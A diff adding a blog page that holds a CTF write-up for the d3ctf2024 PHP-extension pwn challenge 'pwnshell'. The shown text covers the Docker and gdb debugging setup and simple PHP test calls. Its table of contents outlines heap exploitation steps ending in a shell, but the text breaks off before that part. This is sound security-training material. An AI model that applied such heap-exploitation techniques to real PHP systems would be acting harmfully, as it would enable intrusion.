@@ -1,0 +1,976 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-LMV367JHNS"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'G-LMV367JHNS');
+  </script>
+
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    HFTTC&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="前言：大一快结束了，一直听说过 phppwn 但是没有学，最近其实挺累的，打了许多比赛结果被 AI 踹成路边一条，比赛题目也是有很多自己没有见过的，还是沉下心一点点学习吧。 一开始学 phppwn 有点迷，还好之前有一定的 web 基础，做过 web 的 php 代码审计的一类题目。phppwn 的 gdb 调试和普通 pwn 不太一样，需要利用 dockerfile 起一个 docker 环境，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HFTTC&#39;s Blog">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/06/19/PHP-PWN%20d3ctf2024-pwnshell/index.html">
+<meta property="og:site_name" content="HFTTC&#39;s Blog">
+<meta property="og:description" content="前言：大一快结束了，一直听说过 phppwn 但是没有学，最近其实挺累的，打了许多比赛结果被 AI 踹成路边一条，比赛题目也是有很多自己没有见过的，还是沉下心一点点学习吧。 一开始学 phppwn 有点迷，还好之前有一定的 web 基础，做过 web 的 php 代码审计的一类题目。phppwn 的 gdb 调试和普通 pwn 不太一样，需要利用 dockerfile 起一个 docker 环境，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781611553435-48c84e30-2252-4c4e-96c7-19c24b4b2a8c.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781613382788-4107d9af-72e2-4a36-ac8e-db357efc9214.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781613442380-11041201-8c6f-44be-b9e5-7e33e4417b8f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781613602722-014d58ad-6cfa-4365-a6e2-6d5307f8d6cf.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781613632758-1e9bcf8e-9656-4492-b172-acbfa2a20967.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781674239243-6372d9de-2ff6-472c-b052-1816f08d63df.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781674291405-5acc52b1-d988-4a23-9a7c-7183026e7ad9.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781675251691-82ec0315-7c6f-430b-ba55-eea47a5479a6.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781672857121-0a8fa6ee-4257-4b85-9fa0-9244ace89cbe.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781704979157-4a1fa4e0-ea9d-425a-b45b-428494df06fe.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781705009572-1c90c75e-11c0-43a8-8c69-f82361525be3.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781779912862-931dfcaa-cb4b-4047-872f-6d0ca5de4306.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781788033408-c20a69c2-8230-4beb-b5d4-d70263a1dff8.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781787710000-5d1de221-c8cc-40b6-9e1e-220b0cbc062f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781775374369-c8e69ce2-3781-4c7a-9c67-bfcc1fdb00fc.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781777123607-131b57af-4a4d-45fb-97c5-7fdddfb275fe.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781775270396-1b600897-19cd-4b6f-b639-3b781fadcde4.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781777183288-0864e9a8-0d6f-47fe-bd6d-b79e3ed1c5b9.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781787467969-42904d03-2fae-4f03-92fd-3d7130408200.png">
+<meta property="article:published_time" content="2026-06-19T13:43:37.526Z">
+<meta property="article:modified_time" content="2026-06-19T13:43:51.226Z">
+<meta property="article:author" content="HFTTC">
+<meta property="article:tag" content="Pwn, CTF, Binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781611553435-48c84e30-2252-4c4e-96c7-19c24b4b2a8c.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="HFTTC's Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/catalog">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">目录</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">HFTTC&#39;s Blog</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+              <span id="subtitle">Pwn &amp; Security</span>
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHPPWN-GDB-%E6%B5%81%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">PHPPWN GDB 流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E9%95%9C%E5%83%8F"><span class="toc-number">1.1.</span> <span class="toc-text">构建镜像</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%A6%E7%89%B9%E6%9D%83%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8"><span class="toc-number">1.2.</span> <span class="toc-text">带特权启动容器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.3.</span> <span class="toc-text">监听端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gdb-%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8B"><span class="toc-number">1.4.</span> <span class="toc-text">gdb 连接远程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gdb-%E8%B0%83%E8%AF%95%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">1.5.</span> <span class="toc-text">gdb 调试的注意事项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8-exp-%E5%BD%93%E4%B8%AD%E4%B8%8B%E6%96%AD%E7%82%B9%EF%BC%9A"><span class="toc-number">1.6.</span> <span class="toc-text">在 exp 当中下断点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%98%E6%9C%89%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">1.7.</span> <span class="toc-text">还有一种方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA-%E5%88%86%E6%9E%90%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">IDA 分析函数：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#zif-addHacker"><span class="toc-number">2.1.</span> <span class="toc-text">zif_addHacker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zif-removeHacker"><span class="toc-number">2.2.</span> <span class="toc-text">zif_removeHacker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zif-editHacker"><span class="toc-number">2.3.</span> <span class="toc-text">zif_editHacker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zif-displayHacker"><span class="toc-number">2.4.</span> <span class="toc-text">zif_displayHacker</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">EXP 思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E7%BB%95%E8%BF%87-ASLR%EF%BC%89"><span class="toc-number">3.1.</span> <span class="toc-text">信息泄露（绕过 ASLR）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#leakaddr-buffer-%E5%9F%BA%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="toc-number">3.2.</span> <span class="toc-text">leakaddr($buffer) 基地址泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#p64-addr-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%89%93%E5%8C%85"><span class="toc-number">3.3.</span> <span class="toc-text">p64($addr)  数据的打包</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%85%B3%E9%94%AE%E5%9C%B0%E5%9D%80"><span class="toc-number">3.4.</span> <span class="toc-text">泄露关键地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%A0%86%E9%A3%8E%E6%B0%B4"><span class="toc-number">3.5.</span> <span class="toc-text">构造堆风水</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E7%94%A8-chunk12-%E5%92%8C-13-%E8%BF%9B%E8%A1%8C-off-by-null"><span class="toc-number">3.6.</span> <span class="toc-text">复用 chunk12 和 13 进行 off-by-null</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AF%A1%E6%94%B9-strlen-%E4%B8%BA-system%EF%BC%8C%E8%B0%83%E7%94%A8-binsh"><span class="toc-number">3.7.</span> <span class="toc-text">篡改 strlen 为 system，调用 binsh</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">总 EXP：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%EF%BC%9Ahttps-ixout-github-io-posts-5022-index-html-WACON2023-heaphp"><span class="toc-number">5.</span> <span class="toc-text">参考资料：https:&#x2F;&#x2F;ixout.github.io&#x2F;posts&#x2F;5022&#x2F;index.html#WACON2023-heaphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#title-%E2%80%98PHP-PWN-d3ctf2024-pwnshell%E2%80%99date-2026-06-19-21-36-09tags-pwn-php-d3ctfcategories-Notes"><span class="toc-number">6.</span> <span class="toc-text">title: ‘PHP-PWN d3ctf2024-pwnshell’date: 2026-06-19 21:36:09tags:  - pwn  - php  - d3ctfcategories:  - Notes</span></a></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">136</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-PHP-PWN d3ctf2024-pwnshell" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-06-19T13:43:37.526Z" itemprop="datePublished">2026-06-19</time>
+    <time style="display: none;" id="post-update-time">2026-06-19</time>
+  </span>
+    <span class="article-date-link icon-calendar-plus" data-aos="zoom-in">
+      <time datetime="2026-06-19T13:43:51.226Z" itemprop="dateModified">2026-06-19</time>
+    </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <p>前言：大一快结束了，一直听说过 phppwn 但是没有学，最近其实挺累的，打了许多比赛结果被 AI 踹成路边一条，比赛题目也是有很多自己没有见过的，还是沉下心一点点学习吧。</p>
+<p>一开始学 phppwn 有点迷，还好之前有一定的 web 基础，做过 web 的 php 代码审计的一类题目。phppwn 的 gdb 调试和普通 pwn 不太一样，需要利用 dockerfile 起一个 docker 环境，调试的时候也需要有对应的函数。</p>
+<hr>
+<p>好吧还是想吐槽一下，最开始的时候利用 off-by-null 一直有点懵，再想为什么要重复申请这个堆块，后来看了很久才发现 off-by-null 修改了指针地址。之前打堆的时候应该是遇见过一次这样的，其他的时候大部分都是在修改 size 位进行堆重叠的利用。这种方式的 off-by-null 也是很久没有遇见过了，可以算是对于堆基础的一个复习吧。</p>
+<hr>
+<h3 id="PHPPWN-GDB-流程"><a href="#PHPPWN-GDB-流程" class="headerlink" title="PHPPWN GDB 流程"></a>PHPPWN GDB 流程</h3><p>PHPPWN 一般来说都是给一个拓展 .so 文件，我们在写题过程中启用这个拓展就可以直接进行内部函数的调用。</p>
+<p>当然也会给 dockerfile 方便我们起一个 docker 环境复现相同的 php 版本环境：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781611553435-48c84e30-2252-4c4e-96c7-19c24b4b2a8c.png"></p>
+<h4 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h4><p>保存文件后，在终端里重新跑一遍 build 命令（换个名字以示区分）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t pwnshell_debug .</span><br></pre></td></tr></table></figure>
+
+<h4 id="带特权启动容器"><a href="#带特权启动容器" class="headerlink" title="带特权启动容器"></a>带特权启动容器</h4><p>Docker 默认是禁止容器内的进程使用 <code>ptrace</code> 系统调用的，这意味着就算你装了 GDB，你也无法 attach（附加）到任何进程上，会直接报 <code>Operation not permitted</code>。</p>
+<p>你必须在启动时加上 <code>--cap-add=SYS_PTRACE</code> 参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a                         <span class="comment"># 查看当前容器</span></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">rm</span> -f pwn_debug_container     <span class="comment"># 如果有的话，删除掉就容器</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 重新启动一个带 8888 端口映射的新容器</span></span><br><span class="line">docker run -d -p 8080:80 -p 8888:8888 \</span><br><span class="line">  --cap-add=SYS_PTRACE --security-opt seccomp=unconfined \</span><br><span class="line">  --name pwn_debug_container pwnshell_debug /bin/bash</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781613382788-4107d9af-72e2-4a36-ac8e-db357efc9214.png"></p>
+<h4 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 53871d62457c /bin/bash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install -y gdb gdbserver</span><br><span class="line">gdbserver 0.0.0.0:8888 php /var/www/html/index.php</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781613442380-11041201-8c6f-44be-b9e5-7e33e4417b8f.png"></p>
+<h4 id="gdb-连接远程"><a href="#gdb-连接远程" class="headerlink" title="gdb 连接远程"></a>gdb 连接远程</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb -q \</span><br><span class="line">  -ex <span class="string">&quot;add-symbol-file ./stuff/vuln.so&quot;</span> \</span><br><span class="line">  -ex <span class="string">&quot;target remote 127.0.0.1:8888&quot;</span></span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781613602722-014d58ad-6cfa-4365-a6e2-6d5307f8d6cf.png"></p>
+<p>看一眼 vmmap，觉得没什么问题，应该可以进行调试了：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781613632758-1e9bcf8e-9656-4492-b172-acbfa2a20967.png"></p>
+<h4 id="gdb-调试的注意事项"><a href="#gdb-调试的注意事项" class="headerlink" title="gdb 调试的注意事项"></a>gdb 调试的注意事项</h4><p>当我们 gdb 去调试的时候必须得有一段 PHP 代码去触发它。</p>
+<p><code>.so</code> 是一个动态链接库，它自己是不能单独运行的。它的作用是给 PHP 增加新的函数（比如出题人加了一个叫 <code>pwn_hacker()</code> 的函数）。你要想让 GDB 抓住这个漏洞，就必须得让 PHP 引擎去执行这个恶意函数。</p>
+<p>例如我们题目当中假如有 zif_addHacker 这个函数，我们想要下断点就比如要先引用这个函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 当执行到这一行时，GDB 就会在 zif_addHacker 处断下</span></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="number">0x20</span>, <span class="string">&quot;AAAA&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// GDB 继续运行 (c) 后，到这里会在 zif_displayHacker 断下</span></span><br><span class="line"><span class="title function_ invoke__">displayHacker</span>(<span class="number">0</span>);       </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>先写一个 exp.php，然后重复执行上述 gdb 调试操作，然后直接下断点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> breakpoint pending on</span><br><span class="line">pwndbg&gt; b zif_addHacker</span><br><span class="line">pwndbg&gt; b zif_removeHacker</span><br><span class="line">pwndbg&gt; c</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781674239243-6372d9de-2ff6-472c-b052-1816f08d63df.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781674291405-5acc52b1-d988-4a23-9a7c-7183026e7ad9.png"></p>
+<p>这样就可以直接跳转到函数当中。</p>
+<h4 id="在-exp-当中下断点："><a href="#在-exp-当中下断点：" class="headerlink" title="在 exp 当中下断点："></a>在 exp 当中下断点：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;A&quot;</span>, <span class="number">100</span>);</span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="number">0x20</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="number">0x20</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;===== HINT: Checking Heap =====&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="number">0x20</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="number">0x20</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后下断点即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> breakpoint pending on</span><br><span class="line">pwndbg&gt; b zif_var_dump     <span class="comment"># 给你的 hint 设断点</span></span><br><span class="line">pwndbg&gt; c                  <span class="comment"># 让程序继续跑</span></span><br></pre></td></tr></table></figure>
+
+<p>那么在这里还有一个问题：出题人经常会在 php.ini 当中限制 var_dump 函数，我们删掉即可</p>
+<p>直接 Ctrl + f 搜索 var_dump,，然后 Ctrl + k 直接给这一行删了就行</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781675251691-82ec0315-7c6f-430b-ba55-eea47a5479a6.png"></p>
+<p>再次进行上述操作调试：删除旧容器，起一个新容器</p>
